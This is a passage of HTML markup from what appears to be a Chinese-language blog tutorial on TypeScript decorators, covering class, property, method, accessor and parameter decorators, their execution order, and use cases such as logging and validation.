class=\"attr\">\"experimentalDecorators\"</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><h2 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h2><p><img src=\"/typescript/best-practice-of-decorator/xmind.png\" alt=\"decorators\"></p><h3 id=\"类装饰器\"><a href=\"#类装饰器\" class=\"headerlink\" title=\"类装饰器\"></a>类装饰器</h3><p>📌 参数：</p><ul><li><code>target</code>: 类的 <code>构造器（constructor）</code></li></ul><p>⬅️ 返回值: undefined | 替代原有构造器</p><p>因此，类装饰器适合用于继承一个现有类并添加一些属性和方法。<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">rewirteClassConstructor</span>&lt;<span class=\"title\">T</span> <span class=\"title\">extends</span> </span>&#123; <span class=\"keyword\">new</span> (...args: <span class=\"built_in\">any</span>[]): &#123;&#125; &#125;&gt;(<span class=\"keyword\">constructor</span>: T) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">class</span> <span class=\"keyword\">extends</span> <span class=\"keyword\">constructor</span> &#123;</span><br><span class=\"line\">    words = <span class=\"string\">\"rewrite constructor\"</span>;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">@rewirteClassConstructor</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> Speak &#123;</span><br><span class=\"line\">  words: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(<span class=\"params\">t: <span class=\"built_in\">string</span></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.words = t;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">const</span> say = <span class=\"keyword\">new</span> Speak(<span class=\"string\">\"hello world\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(say.words) <span class=\"comment\">// rewrite constructor</span></span><br></pre></td></tr></table></figure><p></p><h3 id=\"属性装饰器\"><a href=\"#属性装饰器\" class=\"headerlink\" title=\"属性装饰器\"></a>属性装饰器</h3><p>📌 参数:</p><ul><li><code>target</code>: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链</li><li><code>propertyKey</code>: 属性名称</li></ul><p>⬅️ 返回值: 返回的结果将被忽略</p><p>除了用于收集信息外，属性装饰器也可以用来给类添加额外的方法和属性。 例如我们可以写一个装饰器来给某些属性添加监听器。<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"reflect-metadata\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">capitalizeFirstLetter</span>(<span class=\"params\">str: <span class=\"built_in\">string</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> str.charAt(<span class=\"number\">0</span>).toUpperCase() + str.slice(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">observable</span>(<span class=\"params\">target: <span class=\"built_in\">any</span>, key: <span class=\"built_in\">string</span></span>): <span class=\"title\">any</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// prop -&gt; onPropChange</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> targetKey = <span class=\"string\">\"on\"</span> + capitalizeFirstLetter(key) + <span class=\"string\">\"Change\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  target[targetKey] = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">fn: (prev: <span class=\"built_in\">any</span>, next: <span class=\"built_in\">any</span>) =&gt; <span class=\"built_in\">void</span></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> prev = <span class=\"keyword\">this</span>[key];</span><br><span class=\"line\">      <span class=\"comment\">// tsconfig.json target to ES6</span></span><br><span class=\"line\">      Reflect.defineProperty(<span class=\"keyword\">this</span>, key, &#123;</span><br><span class=\"line\">        <span class=\"keyword\">set</span>(next) &#123;</span><br><span class=\"line\">          fn(prev, next);</span><br><span class=\"line\">          prev = next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> C &#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"meta\">@observable</span></span><br><span class=\"line\">  foo = <span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  onFooChange(arg0: <span class=\"function\">(<span class=\"params\">prev: <span class=\"built_in\">any</span>, next: <span class=\"built_in\">any</span></span>) =&gt;</span> <span class=\"built_in\">void</span>) &#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> c = <span class=\"keyword\">new</span> C();</span><br><span class=\"line\"></span><br><span class=\"line\">c.onFooChange(<span class=\"function\">(<span class=\"params\">prev, next</span>) =&gt;</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">`prev: <span class=\"subst\">$&#123;prev&#125;</span>, next: <span class=\"subst\">$&#123;next&#125;</span>`</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">c.foo = <span class=\"number\">100</span>; <span class=\"comment\">// -&gt; prev: -1, next: 100</span></span><br><span class=\"line\">c.foo = <span class=\"number\">-3.14</span>; <span class=\"comment\">// -&gt; prev: 100, next: -3.14</span></span><br></pre></td></tr></table></figure><p></p><h3 id=\"方法装饰器\"><a href=\"#方法装饰器\" class=\"headerlink\" title=\"方法装饰器\"></a>方法装饰器</h3><p>📌 参数：</p><ul><li><code>target</code>: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链</li><li><code>propertyKey</code>: 属性名称</li><li><code>descriptor</code>: 属性的 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor\" target=\"_blank\" rel=\"noopener\">描述器</a></li></ul><p>⬅️ 返回值：undefined | 替代属性的描述器。</p><p>方法装饰器<code>descriptor</code>的key为：<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">value</span><br><span class=\"line\">writable</span><br><span class=\"line\">enumerable</span><br><span class=\"line\">configurable</span><br></pre></td></tr></table></figure><p></p><p>通过这个参数我们可以修改方法原本的实现，添加一些共用逻辑。 例如我们可以给一些方法添加打印输入与输出的能力:<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">logger</span>(<span class=\"params\">target: <span class=\"built_in\">any</span>, propertyKey: <span class=\"built_in\">string</span>, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> original = descriptor.value;</span><br><span class=\"line\"></span><br><span class=\"line\">  descriptor.value = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">...args</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'params: '</span>, ...args);</span><br><span class=\"line\">    <span class=\"keyword\">const</span> result = original.call(<span class=\"keyword\">this</span>, ...args);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'result: '</span>, result);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> C &#123;</span><br><span class=\"line\">  <span class=\"meta\">@logger</span></span><br><span class=\"line\">  add(x: <span class=\"built_in\">number</span>, y:<span class=\"built_in\">number</span> ) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x + y;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> c = <span class=\"keyword\">new</span> C();</span><br><span class=\"line\">c.add(<span class=\"number\">1</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\"><span class=\"comment\">// -&gt; params: 1, 2</span></span><br><span class=\"line\"><span class=\"comment\">// -&gt; result: 3</span></span><br></pre></td></tr></table></figure><p></p><h3 id=\"访问器装饰器\"><a href=\"#访问器装饰器\" class=\"headerlink\" title=\"访问器装饰器\"></a>访问器装饰器</h3><p>📌 参数：</p><ul><li><code>target</code>: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链</li><li><code>propertyKey</code>: 属性名称</li><li><code>descriptor</code>: 属性的 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor\" target=\"_blank\" rel=\"noopener\">描述器</a></li></ul><p>⬅️ 返回值：undefined | 替代属性的描述器。</p><p>访问器装饰器<code>descriptor</code>的key为：<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get</span><br><span class=\"line\">set</span><br><span class=\"line\">enumerable</span><br><span class=\"line\">configurable</span><br></pre></td></tr></table></figure><p></p><p>访问器装饰器总体上讲和方法装饰器很接近，唯一的区别在于描述器中有的key不同例如，我们可以将某个属性设为不可变值：<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">immutable</span>(<span class=\"params\">target: <span class=\"built_in\">any</span>, propertyKey: <span class=\"built_in\">string</span>, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> original = descriptor.set;</span><br><span class=\"line\"></span><br><span class=\"line\">  descriptor.set = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">value: <span class=\"built_in\">any</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> original.call(<span class=\"keyword\">this</span>, &#123; ...value &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> C &#123;</span><br><span class=\"line\">  <span class=\"keyword\">private</span> _point = &#123; x: <span class=\"number\">0</span>, y: <span class=\"number\">0</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@immutable</span></span><br><span class=\"line\">  <span class=\"keyword\">set</span> point(value: &#123; x: <span class=\"built_in\">number</span>, y: <span class=\"built_in\">number</span> &#125;) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>._point = value;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">get</span> point() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>._point;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> c = <span class=\"keyword\">new</span> C();</span><br><span class=\"line\"><span class=\"keyword\">const</span> point = &#123; x: <span class=\"number\">1</span>, y: <span class=\"number\">1</span> &#125;</span><br><span class=\"line\">c.point = point;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(c.point === point)</span><br><span class=\"line\"><span class=\"comment\">// -&gt; false</span></span><br></pre></td></tr></table></figure><p></p><h3 id=\"参数装饰器\"><a href=\"#参数装饰器\" class=\"headerlink\" title=\"参数装饰器\"></a>参数装饰器</h3><p>📌 参数：</p><ul><li><code>target</code>: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链</li><li><code>propertyKey</code>: 属性的名称(注意是方法的名称，而不是参数的名称)</li><li><code>paramerterIndex</code>: 参数在方法中所处的位置的下标</li></ul><p>⬅️ 返回值：返回的值将会被忽略。</p><p>单独的参数装饰器能做的事情很有限，它一般都被用于记录可被其它装饰器使用的信息。<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// parameter.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"reflect-metadata\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">required</span>(<span class=\"params\">target: <span class=\"built_in\">Object</span>, propertyKey: <span class=\"built_in\">string</span> | symbol, parameterIndex: <span class=\"built_in\">number</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> existingRequiredParameters: <span class=\"built_in\">number</span>[] = Reflect.getOwnMetadata(<span class=\"string\">'required'</span>, target, propertyKey) || [];</span><br><span class=\"line\">    existingRequiredParameters.push(parameterIndex);</span><br><span class=\"line\">    Reflect.defineMetadata(<span class=\"string\">'required'</span>, existingRequiredParameters, target, propertyKey);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">validate</span>(<span class=\"params\">target: <span class=\"built_in\">any</span>, propertyName: <span class=\"built_in\">string</span>, descriptor: TypedPropertyDescriptor&lt;<span class=\"built_in\">Function</span>&gt;</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> method = descriptor.value!;</span><br><span class=\"line\">   </span><br><span class=\"line\">    descriptor.value = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> requiredParameters: <span class=\"built_in\">number</span>[] = Reflect.getOwnMetadata(<span class=\"string\">'required'</span>, target, propertyName);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (requiredParameters) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> parameterIndex of requiredParameters) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (parameterIndex &gt;= <span class=\"built_in\">arguments</span>.length || <span class=\"built_in\">arguments</span>[parameterIndex] === <span class=\"literal\">undefined</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">\"Missing required argument.\"</span>);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> method.apply(<span class=\"keyword\">this</span>, <span class=\"built_in\">arguments</span>);</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> BugReport &#123;</span><br><span class=\"line\">    <span class=\"keyword\">type</span> = <span class=\"string\">\"report\"</span>;</span><br><span class=\"line\">    title: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">t: <span class=\"built_in\">string</span></span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.title = t;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"meta\">@validate</span></span><br><span class=\"line\">    print(<span class=\"meta\">@required</span> verbose: <span class=\"built_in\">boolean</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (verbose) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">`type: <span class=\"subst\">$&#123;<span class=\"keyword\">this</span>.<span class=\"keyword\">type</span>&#125;</span>\\ntitle: <span class=\"subst\">$&#123;<span class=\"keyword\">this</span>.title&#125;</span>`</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.title; </span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> report = <span class=\"keyword\">new</span> BugReport(<span class=\"string\">'mode error'</span>);</span><br></pre></td></tr></table></figure><p></p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// test.js</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; report &#125; = <span class=\"built_in\">require</span>(<span class=\"string\">'./paramerter.js'</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(report.print()); <span class=\"comment\">// Error: Missing required argument.</span></span><br></pre></td></tr></table></figure><h2 id=\"执行顺序\"><a href=\"#执行顺序\" class=\"headerlink\" title=\"执行顺序\"></a>执行顺序</h2><p>不同类型的装饰器执行顺序是明确的：<br>1、 实例成员：参数装饰器 -&gt; 方法/访问器/属性 装饰器<br>2、 静态成员：参数装饰器 -&gt; 方法/访问器/属性 装饰器<br>3、 构造函数：参数装饰器<br>4、 类装饰器<br>例如：</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\">key: <span class=\"built_in\">string</span></span>): <span class=\"title\">any</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"evaluate: \"</span>, key);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"call: \"</span>, key);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@f</span>(<span class=\"string\">\"Class Decorator\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">class</span> A &#123;</span><br><span class=\"line\">  <span class=\"meta\">@f</span>(<span class=\"string\">\"Static Property\"</span>)</span><br><span class=\"line\">  <span class=\"keyword\">static</span> prop?: <span class=\"built_in\">number</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@f</span>(<span class=\"string\">\"Static Method\"</span>)</span><br><span class=\"line\">  <span class=\"keyword\">static</span> method(<span class=\"meta\">@f</span>(<span class=\"string\">\"Static Method Parameter\"</span>) foo) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"meta\">@f</span>(<span class=\"string\">\"Constructor Parameter\"</span>) foo</span>) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@f</span>(<span class=\"string\">\"Instance Method\"</span>)</span><br><span class=\"line\">  method(<span class=\"meta\">@f</span>(<span class=\"string\">\"Instance Method Parameter\"</span>) foo) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@f</span>(<span class=\"string\">\"Instance Property\"</span>)</span><br><span class=\"line\">  prop?: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 执行顺序</span></span><br><span class=\"line\">evaluate:  Instance Method</span><br><span class=\"line\">evaluate:  Instance Method Parameter</span><br><span class=\"line\">call:  Instance Method Parameter</span><br><span class=\"line\">call:  Instance Method</span><br><span class=\"line\">evaluate:  Instance Property</span><br><span class=\"line\">call:  Instance Property</span><br><span class=\"line\">evaluate:  Static Property</span><br><span class=\"line\">call:  Static Property</span><br><span class=\"line\">evaluate:  Static Method</span><br><span class=\"line\">evaluate:  Static Method Parameter</span><br><span class=\"line\">call:  Static Method Parameter</span><br><span class=\"line\">call:  Static Method</span><br><span class=\"line\">evaluate:  Class Decorator</span><br><span class=\"line\">evaluate:  Constructor Parameter</span><br><span class=\"line\">call:  Constructor Parameter</span><br><span class=\"line\">call:  Class Decorator</span><br></pre></td></tr></table></figure><p>然而，在同一方法中的不同参数构造器顺序是相反的，最后参数回的装饰器会先被执行：<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\">key: <span class=\"built_in\">string</span></span>): <span class=\"title\">any</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"evaluate: \"</span>, key);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"call: \"</span>, key);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> B &#123;</span><br><span class=\"line\">  <span class=\"meta\">@f</span>(<span class=\"string\">'first'</span>)</span><br><span class=\"line\">  <span class=\"meta\">@f</span>(<span class=\"string\">'second'</span>)</span><br><span class=\"line\">  method() &#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 执行顺序</span></span><br><span class=\"line\">evaluate:  first</span><br><span class=\"line\">evaluate:  second</span><br><span class=\"line\">call:  second</span><br><span class=\"line\">call:  first</span><br></pre></td></tr></table></figure><p></p><h2 id=\"使用场景\"><a href=\"#使用场景\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h2><ul><li>Before/After钩子。</li><li>监听属性改变或者方法调用。</li><li>对方法的参数做转换。</li><li>添加额外的方法和属性。</li><li>运行时类型检查。</li><li>自动编解码。</li><li>依赖注入。</li></ul><h3 id=\"使用举例\"><a href=\"#使用举例\" class=\"headerlink\" title=\"使用举例\"></a>使用举例</h3><ul><li><p>日志打印</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\"></span>): <span class=\"title\">any</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">target, key, descriptor</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> method = descriptor.value;</span><br><span class=\"line\">    descriptor.value = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"string\">'param: '</span>, 